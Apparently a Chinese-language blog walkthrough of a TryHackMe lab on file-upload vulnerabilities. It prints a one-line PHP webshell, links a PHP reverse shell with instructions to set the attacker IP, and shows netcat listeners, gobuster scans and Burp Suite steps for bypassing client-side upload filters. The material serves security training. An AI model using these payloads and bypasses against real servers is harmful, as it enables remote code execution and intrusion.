<p>在 Linux 和 MacOS 上，hosts文件可以通过终端在 &#x2F;etc&#x2F;hosts 路径下找到。<br>在 Windows 上，hosts文件可以在 C:\Windows\System32\drivers\etc\hosts 路径下找到（可以不通过终端）。</p>
<p>在 Linux 或 MacOS 上，您将需要在终端界面使用 sudo 打开文件进行写入。<br>在 Windows 中，你需要用“ Run as Administrator”打开该文件（先在电脑中找到该文件）。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">这里主要介绍在kali等linux系统中的操作方法：</span><br><span class="line"></span><br><span class="line">使用命令,在hosts文件的内容末尾添加代码行:</span><br><span class="line">echo 10.10.190.98    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm &gt;&gt;/etc/hosts</span><br><span class="line"></span><br><span class="line">注意: </span><br><span class="line">如果你在此之前已经完成了上述步骤，那么你必须删除以前的host条目。</span><br><span class="line">hosts文件中应该只有一行包含上述 URL。</span><br><span class="line">例如，下面的示例将不起作用:</span><br><span class="line"></span><br><span class="line">10.10.10.10    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm</span><br><span class="line"></span><br><span class="line">10.10.190.98    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220924184856252.png"
                      alt="image-20220924184856252"
                ></p>
<h2 id="上传漏洞简介和一般利用方法"><a href="#上传漏洞简介和一般利用方法" class="headerlink" title="上传漏洞简介和一般利用方法"></a>上传漏洞简介和一般利用方法</h2><p><strong>上传漏洞简介</strong></p>
<p>将文件上传到服务器的能力已经成为我们如何与 Web应用程序进行交互的一个组成部分。<br>无论是社交媒体网站的个人资料图片、上传到云存储的报告，还是在 Github 上保存项目，具有文件上传功能的应用程序都是无限的。</p>
<p>不幸的是，如果处理不当，文件上传也会在服务器中引发严重的漏洞，这可能会导致一系列麻烦的问题的出现。<br>如果攻击者设法上传并执行 shell，则可能导致完全的远程代码执行(Remote Code Execution，RCE)。<br>通过不受限制地上传到服务器(以及随意检索数据的能力) ，攻击者可以破坏或以其他方式改变现有内容——包括注入恶意网页，从而导致进一步的漏洞，如 XSS 或 CSRF。<br>通过上传任意文件，攻击者还可能使用服务器来承载和&#x2F;或提供非法内容，或泄漏敏感信息。<br>实际上，攻击者如果能够将自己选择的文件上传到你的服务器上(没有任何限制) ，那么这种攻击实际上是非常危险的。</p>
<p>本文的目的是探讨由于不正确(或不充分)处理文件上传操作 而导致的一些漏洞。具体来说，我们将关注:<br>1.文件上传 覆盖服务器上的现有文件<br>2.文件上传 在服务器上上传和执行 Shell<br>3.文件上传 绕过客户端过滤<br>4.文件上传 绕过各种服务器端过滤<br>5.文件上传 欺骗内容类型验证检查</p>
<p><strong>一般利用方法</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">那么，我们现在发现一个网站上有一个文件上传点，我们该如何利用它呢？</span><br><span class="line"></span><br><span class="line">对于任何类型的黑客攻击，枚举都是关键。我们越了解我们的环境，我们就越能利用它。</span><br><span class="line">查看页面的源代码有助于了解是否应用了任何类型的客户端筛选。</span><br><span class="line">使用像 Gobuster 这样的目录爆破工具进行扫描 通常对网络攻击很有帮助，并且可能会显示文件上传到了哪里，</span><br><span class="line">Kali默认情况下不会安装Gobuster，但是可以通过命令：sudo apt install gobuster 进行gobuster的安装。</span><br><span class="line">使用Burpsuit拦截上传请求也会派上用场。</span><br><span class="line">诸如Wappalyzer之类的浏览器扩展插件可以提供关于目标站点的有价值的信息。</span><br><span class="line"></span><br><span class="line">对网站如何处理我们的输入有一个基本的了解，然后我们就可以尝试四处查看，看看我们能上传什么，不能上传什么。</span><br><span class="line">如果网站使用了客户端过滤，那么我们可以很容易地查看过滤器的代码，并寻找绕过它，</span><br><span class="line">如果网站有服务器端过滤的地方，那么我们可能需要猜测一下过滤器在寻找什么，上传一个文件，如果上传失败，再根据错误消息尝试不同的方法。</span><br><span class="line">上传能够引发错误的文件可以帮助判断服务器端过滤的情况。</span><br><span class="line">在这个阶段，像 Burpsuite或者OWASP Zap这样的工具非常有用。</span><br></pre></td></tr></table></figure></div>

<h2 id="覆盖服务器上的现有文件"><a href="#覆盖服务器上的现有文件" class="headerlink" title="覆盖服务器上的现有文件"></a>覆盖服务器上的现有文件</h2><h3 id="理论讲解"><a href="#理论讲解" class="headerlink" title="理论讲解"></a>理论讲解</h3><p>当文件上传到服务器时，服务器应该进行一系列检查，以确保文件不会覆盖服务器上已经存在的任何内容。<br>通常的做法是给文件分配一个新名称（一般是随机的），或者将上传的日期和时间添加到原始文件名的开头或结尾，<br>或者可以应用检查来查看文件名是否已经存在于服务器上，如果同名文件已经存在，那么服务器将返回一个错误消息，要求用户选择一个不同的文件名。<br>当保护现有文件不被覆盖时，文件权限也会发挥作用：例如，Web用户不应该对 Web 页面有可写权限，从而防止web页面被攻击者上传的恶意版本所覆盖。</p>
<p>如果目标没有采取这样的预防措施，那么我们可能就能够覆盖目标服务器上的现有文件。<br>实际上，服务器上的文件权限可能会防止这种情况成为一个严重的漏洞，在挖掘漏洞的时候 关于服务器的文件权限值得我们密切关注。</p>
<p>例子：</p>
<p>在下图中，我们有一个带有上传表单的网页:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220924165157794.png"
                      alt="image-20220924165157794"
                ></p>
<p>对于真正的挑战，你可能需要列举更多内容; 但是，这只是一个简单的例子，在这个实例中，让我们看一下页面的源代码:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220924165313511.png"
                      alt="image-20220924165313511"
                ></p>
<p>在上图的红色框中，我们能看到负责显示页面上的图像的代码。图片来源于一个名为“ spaniel.jpg”的文件，该图片在一个名为“ images”的目录中。</p>
<p>现在我们知道图像是从哪里提取的了，我们能覆盖它吗？</p>
<p>让我们从互联网上下载另一张图片，命名为 spineel.jpg。然后我们会把它上传到网站，看看是否能覆盖现有的图片:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220924165623733.png"
                      alt="image-20220924165623733"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220924165646810.png"
                      alt="image-20220924165646810"
                ></p>
<h3 id="实践操作"><a href="#实践操作" class="headerlink" title="实践操作"></a>实践操作</h3><p>任务要求：打开你的网页浏览器并导航到overwrite.uploadvulns.thm ，你的目标是用你自己上传的文件 覆盖服务器上的文件。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220924185206709.png"
                      alt="image-20220924185206709"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220924185713701.png"
                      alt="image-20220924185713701"
                ></p>
<p>上传成功，获得flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220924185816261.png"
                      alt="image-20220924185816261"
                ></p>
<h2 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h2><h3 id="理论讲解-1"><a href="#理论讲解-1" class="headerlink" title="理论讲解"></a>理论讲解</h3><p>如果可以完全覆盖服务器上已经存在的文件，那么对于维护站点的人来说是一个麻烦，因为文件覆盖可能会导致一些其他漏洞，</p>
<p>现在让我们更进一步，尝试验证远程代码执行漏洞：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">远程代码执行，顾名思义，就是允许我们在 Web 服务器上执行任意代码</span><br><span class="line">虽然这可能是一个低权限的 Web 用户帐户(如 Linux 服务器上的 www-data账户) ,但是这仍然是一个非常严重的漏洞。</span><br><span class="line"></span><br><span class="line">通过 Web 应用程序中的上传漏洞远程执行代码，往往利用的是上传与网站后端使用相同语言编写的程序（或者是服务器能够理解并能执行的另一种语言）</span><br><span class="line">传统的后端语言是PHP，然而，其他后端语言也已经变得更加普遍（主要的例子有Python Django、Node.js 形式的 Javascript等）</span><br><span class="line"></span><br><span class="line">值得注意的是，在路由应用程序中(路由是通过编程方式定义的应用程序，而不是映射到文件系统的应用程序)这种攻击方法变得更加复杂，发生的可能性也大大降低。</span><br><span class="line">大多数现代 Web 框架都是通过编程方式实现路由的。</span><br><span class="line"></span><br><span class="line">在利用文件上传漏洞时，有两种基本的方法可以在 Web 服务器上实现 RCE（远程代码执行）：Webshell和反向/绑定 shell</span><br><span class="line">实际上，一个功能完备的反向/绑定 shell 是攻击者的理想目标；</span><br><span class="line">然而，有时候webshell可能是唯一可用的选择（例如在以下环境中：目标服务器对上传功能施加了文件长度限制，或者防火墙规则阻止任何基于网络的 shell）</span><br><span class="line"></span><br><span class="line">作为一种通用的方法论，我们希望上传一种或另一种 shell，然后激活它，如果服务器允许，我们就能直接导航到该文件（限制不足的非路由应用程序）；</span><br><span class="line">或者以其他方式强制 webapp 为我们运行脚本（这在路由应用程序中是必需的）。</span><br></pre></td></tr></table></figure></div>

<p><strong>webshell实现RCE</strong></p>
<p>假设我们找到了一个带有上传表单的网页:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220924192650805.png"
                      alt="image-20220924192650805"
                ></p>
<p>我们接下来怎么办? 我们从扫描开始:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220924192730491.png"
                      alt="image-20220924192730491"
                ></p>
<p>我们看到了两个比较值得注意的目录：uploads和assets</p>
<p>我们上传的任何文件似乎都将放置在“uploads”目录中，我们先上传一个合法的图像文件：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220924193316086.png"
                      alt="image-20220924193316086"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220924194029486.png"
                      alt="image-20220924194029486"
                ></p>
<p>现在，如果我们去 <a class="link"   href="http://demo.uploadvulns.thm/uploads" >http://demo.uploadvulns.thm/uploads <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 页面，我们应该能够看到照片已经上传了！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220924194854826.png"
                      alt="image-20220924194854826"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220924194936039.png"
                      alt="image-20220924194936039"
                ></p>
<p>我们已经验证了可以成功上传我们自己的图片，现在让我们尝试一个 webshell。</p>
<p>实际上，我们知道这个 webserver 是用PHP开发后端页面的，所以我们将直接跳到创建和上传PHP的 webshell。</p>
<p>在实战中，我们可能需要多做一些枚举，PHP是一个很好的起点。</p>
<p>一个简单的 webshell 通过获取一个参数并将其作为系统命令执行来工作，在 PHP 中，这样做的语法是：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>此代码将接受一个 GET 参数，并将其作为系统命令执行，然后将输出回显到屏幕上。</p>
<p>让我们尝试把它上传到网站，然后用它来显示我们当前的用户和工作目录的内容:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220924200128060.png"
                      alt="image-20220924200128060"
                ></p>
<p>我们现在可以使用这个 shell 从系统中读取文件，或者从这里升级到反向 shell。现在我们有了 RCE，选择是无限的。</p>
<p>注意：在使用 webshell 时，查看页面的源代码通常更容易查看输出，这大大改进了输出的格式。</p>
<p><strong>反向shell实现RCE</strong></p>
<p>上传反向 shell 的过程与上传 webshell 的过程几乎完全相同，我们将使用Pentest Monkey文档建立反向 shell，这在Kali Linux 上是默认安装的，</p>
<p>该文档的链接是：<a class="link"   href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" >https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>你需要编辑这个 shell 的第49行：$ip &#x3D; ‘127.0.0.1’; &#x2F;&#x2F; CHANGE THIS  </p>
<p>将127.0.0.1更改为 TryHackMe提供的 tun0 IP 地址（在<a class="link"   href="https://tryhackme.com/access" >https://tryhackme.com/access <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 页面可以找到，这代表的是攻击机的内部虚拟 IP 地址）</p>
<p>修改完shell文件后，接下来我们需要做的是启动一个 Netcat 监听器来接收连接，输入命令： nc -lvnp 1234</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220924202051550.png"
                      alt="image-20220924202051550"
                ></p>
<p>现在，让我们上传 shell，然后通过浏览器url导航到<a class="link"   href="http://demo.uploadvulns.thm/uploads/shell.php" >http://demo.uploadvulns.thm/uploads/shell.php <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
<p>这个 shell 的名字，就是你自己命令的shell文件的名字（默认情况下是php-reverse-shell.php）</p>
<p>此时网站会被挂起，无法正常加载内容，当我们切换回我们的终端界面时，我们可以看到我们获取了一个反向shell：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220924202734098.png"
                      alt="image-20220924202734098"
                ></p>
<h3 id="实践操作-1"><a href="#实践操作-1" class="headerlink" title="实践操作"></a>实践操作</h3><p>任务要求：打开你的网页浏览器并导航到shell.uploadvulns.thm，实现一个简单的RCE。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">先进行目录扫描，使用gobuster，输入以下命令：</span><br><span class="line">gobuster dir -u http://shell.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220924204803595.png"
                      alt="image-20220924204803595"
                ></p>
<p>发现&#x2F;resources目录是文件上传点</p>
<p>准备好一个反向shell文件（<a class="link"   href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" >https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ）</p>
<p>将shell文件中的ip地址为攻击机的虚拟内部地址（<a class="link"   href="https://tryhackme.com/access" >https://tryhackme.com/access <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ）：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220924212035175.png"
                      alt="image-20220924212035175"
                ></p>
<p>在攻击机终端设置监听，利用目标的文件上传点——上传shell文件，上传完毕之后，先访问shell文件，再查看终端界面：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220924212830528.png"
                      alt="image-20220924212830528"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220924212952319.png"
                      alt="image-20220924212952319"
                ></p>
<p>使用shell界面，找到flag文件：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220924213305430.png"
                      alt="image-20220924213305430"
                ></p>
<h2 id="关于“过滤”的介绍"><a href="#关于“过滤”的介绍" class="headerlink" title="关于“过滤”的介绍"></a>关于“过滤”的介绍</h2><p>首先，让我们讨论一下客户端过滤和服务器端过滤之间的区别。</p>
<p><strong>客户端过滤：</strong></p>
<p>当我们谈论一个“客户端”的脚本时,在 Web 应用程序的环境中，我们的意思是它运行在用户的浏览器上，而不是运行在Web 服务器上。主流的客户端脚本语言是JavaScript 。</p>
<p>无论使用何种语言，客户端脚本都会在浏览器中运行，在文件上传的上下文中，这意味着过滤发生在文件上传到服务器之前。</p>
<p>理论上讲，这应该是件好事，然而，因为过滤是在我们的计算机上发生的，所以我们很容易绕过它。因此，像这样通过客户端过滤来验证上载的文件是否为恶意文件，本身就是一种高度不安全的方法。</p>
<p><strong>服务器端过滤：</strong></p>
<p>服务器端脚本将在服务器上运行。在传统上，PHP 是主要的服务器端语言(微软IIS的ASP则紧随其后），最近几年，其他几种服务端脚本语言（C # ，Node.js，Python，Ruby on Rails等等）也得到了广泛地应用。服务器端过滤往往更难绕过，因为你面前没有代码。</p>
<p>当代码在服务器上执行时，在大多数情况下，也不可能完全绕过过滤；所以我们必须在符合过滤的地方 形成一个有效载荷（payload），从而让服务器端仍然允许我们执行代码。</p>
<p>谈完了客户端过滤和服务器端过滤，让我们看看具体的一些不同类型的过滤：</p>
<p><strong>文件扩展名验证：</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件扩展名(理论上)用于标识文件的内容。</span><br><span class="line">在实践中，它们很容易改变，所以实际上并没有多大意义。</span><br><span class="line">然而，MS Windows 仍然使用它们来识别文件类型，尽管基于 Unix 的系统倾向于依赖其他方法，</span><br><span class="line">检查文件扩展名的筛选器有两种工作方式。它们要么是黑名单扩展(即有一个不允许的扩展名列表) ，要么是白名单扩展(即有一个允许的扩展名列表，并拒绝所有其他扩展名)。</span><br></pre></td></tr></table></figure></div>

<p><strong>文件类型过滤：</strong></p>
<p>文件类型过滤 类似于文件扩展名验证，但是更加密集，文件类型过滤会再次验证文件的内容是否可以上传。<br>我们将研究两种类型的文件类型验证:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">MIME 验证:</span><br><span class="line">MIME (多用途 Internet 邮件扩展)类型用作文件的标识符——最初是在通过电子邮件作为附件传输时使用，现在也在通过 HTTP (S)传输文件时使用。</span><br><span class="line">文件上传的 MIME 类型附加在请求的头部，看起来像这样:</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220924231155849.png"
                      alt="image-20220924231155849"
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">MIME类型遵循的格式为： &lt; type &gt;/&lt; subtype &gt; 。</span><br><span class="line">在上面的请求中，你可以看到图片“ Spaniel.jpg”已经上传到服务器。</span><br><span class="line">作为一个合法的 JPEG 图像，这次上传的 MIME 类型是“ image/JPEG”。</span><br><span class="line">文件的 MIME 类型可以在客户端和/或服务器端进行检查，但是，由于 MIME 是基于文件的扩展名的，因此也很容易绕过它。</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">魔术数字验证:</span><br><span class="line">魔术数字是确定文件内容的更准确的方法，尽管它们并非不可伪造。</span><br><span class="line">文件的“魔术数字”是指标识文件内容 在文件内容开头位置的一串字节。</span><br><span class="line">例如，一个 PNG 文件在文件的最顶部有这些字节:89 50 4E 47 0D 0A 1A 0A</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220924231259948.png"
                      alt="image-20220924231259948"
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">与Windows系统不同的是，Unix系统使用魔法数字来识别文件。</span><br><span class="line">Unix类型的系统 在处理文件上传时，会检查上传文件的魔法数字，以确保文件能够被安全接受。</span><br><span class="line">这绝不是一个有保证的解决方案，但它比检查文件的扩展名更有效。</span><br></pre></td></tr></table></figure></div>

<p><strong>文件长度过滤:</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件长度过滤 用于防止通过上传表单将大型文件上传到服务器(因为这可能导致服务器资源短缺)。</span><br><span class="line">在大多数情况下，当我们上传 shell 时，这不会给我们带来任何问题。</span><br><span class="line">但是，值得注意的是，如果上传表单只希望上传一个非常小的文件，可能会有一个长度过滤，以确保遵守文件长度要求。</span><br><span class="line">作为一个例子，我们前一个任务中的PHP反向shell文件 大小为5.4 Kb ——相对较小，但是如果表单期望的文件最大为2Kb，那么我们需要找到一个替代的 shell 来上传。</span><br></pre></td></tr></table></figure></div>

<p><strong>文件名过滤:</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">如前所述，上传到服务器的文件应该是唯一的。</span><br><span class="line">通常这意味着向文件名添加一些随机字符，但是，另一种策略是检查服务器上是否已经存在同名文件，如果存在，则返回给用户一个错误提示。</span><br><span class="line">此外，文件名应该在上传时进行消毒，以确保它们不包含任何“坏字符”，“坏字符”可能会在上传时对文件系统造成潜在的问题(例如，Linux 上的空字节或正斜杠，以及控制字符&quot;;&quot; 和潜在的Unicode 字符......)。</span><br><span class="line">这对我们来说意味着，在一个管理良好的系统上，我们上传后的文件不太可能与上传前的文件名称相同，所以要注意，如果你设法绕过了过滤，你可能还要找到上传后的shell。</span><br></pre></td></tr></table></figure></div>

<p><strong>文件内容过滤:</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">更复杂的过滤系统可能会扫描上传文件的全部内容，以确保文件不会在扩展名、 MIME 类型和 Magic Number上面进行欺骗。</span><br><span class="line">这是一个明显比大多数基本过滤系统更复杂的过滤过程。</span><br></pre></td></tr></table></figure></div>

<p>值得注意的是，这些过滤本身都不是完美的——它们通常会相互结合使用，提供一个多层过滤，从而大大提高了上传的安全性。这些过滤器的任何一个都可以单独应用于客户端、服务器端或两者兼而有之（同时应用在前端和后端）。</p>
<p>类似地，不同的框架和语言都有自己固有的过滤和验证上传文件的方法。因此，可能会出现特定于语言的漏洞。</p>
<p>例如，在 PHP 主要版本php5之前，通过附加一个null空字节能够绕过文件扩展名过滤，后面再跟有效的扩展名.php，从而形成一个恶意的php webshell文件。</p>
<p>还可以将 PHP 代码注入到本来有效的图像文件的 exif 数据中，然后强制服务器执行它。</p>
<h2 id="绕过客户端过滤"><a href="#绕过客户端过滤" class="headerlink" title="绕过客户端过滤"></a>绕过客户端过滤</h2><h3 id="理论讲解-2"><a href="#理论讲解-2" class="headerlink" title="理论讲解"></a>理论讲解</h3><p>正如前面所提到的，客户端过滤非常容易绕过，因为它完全发生在你所控制的机器上，当你能够访问代码时，就很容易去修改它。</p>
<p>有四种简单的方法可以绕过一般的客户端文件上传过滤:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.关闭浏览器中的 Javascript以绕过客户端过滤 ——如果网站不需要 Javascript 来提供基本的功能，那么这种绕过方法就是有效的。</span><br><span class="line">如果完全关闭 Javascript 将阻止站点工作，那么你可能需要选择其他方法来进行绕过客户端过滤，</span><br><span class="line"></span><br><span class="line">2.拦截并修改将要加载的web页面。使用 Burpsuit，我们可以拦截传入的Web页面，并在 Javascript 过滤器有机会运行之前就删除这个过滤器。</span><br><span class="line"></span><br><span class="line">3.拦截并修改文件然后再上传。前一个方法在加载网页之前工作，这个方法则允许网页正常加载，在文件已经通过，并被过滤器接受之后，再拦截文件上传操作（upload）。</span><br><span class="line"></span><br><span class="line">4.直接将文件发送到上传点，当你可以直接使用像 curl 这样的工具发送文件时，为什么要使用带有过滤器的网页呢？这种将数据直接发布到包含处理文件上传代码的页面是完全绕过客户端过滤器的另一种有效方法。</span><br><span class="line">在这里，我们不会深入讨论这种方法，但是，这种命令的语法应该是这样的:</span><br><span class="line">curl -X POST -F &quot;submit:&lt;value&gt;&quot; -F &quot;&lt;file-parameter&gt;:@&lt;path-to-file&gt;&quot; &lt;site&gt;</span><br><span class="line">要使用这种方法，首先要拦截一次成功的上传(使用 BurpSuite 或浏览器控制台) ，查看上传中使用的参数，然后将这些参数插入上面的命令。</span><br></pre></td></tr></table></figure></div>

<p>我们将在下面深入讨论第二和第三种方法。</p>
<p>让我们再次假设，我们在一个网站上找到了一个上传页面:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220925164435363.png"
                      alt="image-20220925164435363"
                ></p>
<p>像往常一样，我们先看一下源代码。这里我们看到一个基本的 Javascript 函数 它用于检查上传文件的 MIME 类型:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220925164501313.png"
                      alt="image-20220925164501313"
                ></p>
<p>在这个例子中，我们可以看到过滤器使用了一个白名单来排除任何不是 image&#x2F;jpeg 的 MIME 类型。</p>
<p>我们的下一步操作是尝试进行文件上传——正如预期的那样，如果我们选择一个 jpeg图片，过滤器函数就会接受它，否则上传行为将会被拒绝。</p>
<p>了解了这些信息之后，让我们启动 Burpsuite 的拦截功能 并重新加载原网页。在Burpsuite中我们将看到我们对站点的请求消息，但是我们真正想看到的是服务器的响应消息，所以右键单击截获的数据，向下滚动到“ Do Intercept”，然后选择“ Response to this request”:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220925164617843.png"
                      alt="image-20220925164617843"
                ></p>
<p>当我们点击窗口顶部的“Forward”按钮时，我们将看到服务器对我们的请求的响应。在这里，我们可以删除、注释掉 Javascript 过滤器函数，或者在它有机会加载之前中断它:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220925164651853.png"
                      alt="image-20220925164651853"
                ></p>
<p>删除过滤函数后，我们再次点击“Forward”，直到浏览器中的网站页面完成加载。现在我们可以自由上传任何类型的文件到网站:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220925164718959.png"
                      alt="image-20220925164718959"
                ></p>
<p>这里值得注意的是，在默认情况下，Burpsuite 不会拦截 Web 页面正在加载的任何外部 Javascript 文件。如果你需要编辑一个不在正在加载的主页面中的脚本（也就是外部js脚本），你需要点击 Burpsuite窗口顶部的“ Options”选项卡，然后在“ Intercept Client Request”（拦截客户端请求）部分，编辑第一行的“文件扩展名-不匹配”的条件（condition），删除^js$| :</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220925164819834.png"
                      alt="image-20220925164819834"
                ></p>
<p>我们已经通过在加载页面之前拦截和删除过滤器函数绕过了这个过滤，现在让我们尝试先上传一个具有合法扩展名和 MIME 类型的文件，然后再用 Burpsuite 进行拦截和更正上传。</p>
<p>重新加载网页（这时过滤器函数将重新生效），让我们使用之前使用的反向 shell 并将其重命名为“ shell.jpg”。当 MIME 类型(基于文件扩展名)自动检查完成时，客户端的过滤器会让我们的payload（有效载荷）通过:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220925164850109.png"
                      alt="image-20220925164850109"
                ></p>
<p>激活 Burpsuite 拦截功能，然后在网页中单击“uplpad（上传）”，Burpsuite 就会自动捕捉该上传请求:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220925164914830.png"
                      alt="image-20220925164914830"
                ></p>
<p>请注意，我们的 PHP shell 的 MIME 类型当前是 image&#x2F;jpeg。我们将其更改为 text&#x2F;x-php，并将文件扩展名从.jpg改成.php，然后再将这个请求转发到服务器:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220925165002906.png"
                      alt="image-20220925165002906"
                ></p>
<p>我们先在攻击机终端设置好netcat 监听器，然后我们再导航到 <a class="link"   href="http://demo.uploadvulns.thm/uploads/shell.php" >http://demo.uploadvulns.thm/uploads/shell.php <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 页面，由下图能够看到攻击机终端已经成功接收到一个连接，反向shell已建立！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220925165030643.png"
                      alt="image-20220925165030643"
                ></p>
<h3 id="实践操作-2"><a href="#实践操作-2" class="headerlink" title="实践操作"></a>实践操作</h3><p>任务要求：使用浏览器导航到java.uploadvulns.thm页面，并绕过过滤器获得一个反向 shell。请记住，并非所有客户端脚本都是内联的（意思就是有时候会存在外部脚本）！</p>
<p>使用gobuster对目标站点进行目录爆破：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://java.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220925222043825.png"
                      alt="image-20220925222043825"
                ></p>
<p>修改要上传的shell文件的内容，将IP地址和端口设置一下（IP地址设置为TryHackMe配置给攻击机的虚拟内部地址，端口自定义即可），在攻击机上打开一个终端窗口，输入命令设置一个Netcat监听器，监听1234端口：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nlvp 1234</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220925212329121.png"
